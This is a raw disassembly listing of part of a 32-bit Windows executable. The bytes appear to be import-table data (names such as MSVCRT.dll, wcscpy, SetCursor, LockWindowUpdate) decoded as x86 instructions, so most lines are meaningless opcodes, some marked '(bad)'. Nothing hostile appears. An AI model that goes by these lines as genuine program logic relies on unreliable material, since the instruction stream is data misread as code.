  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
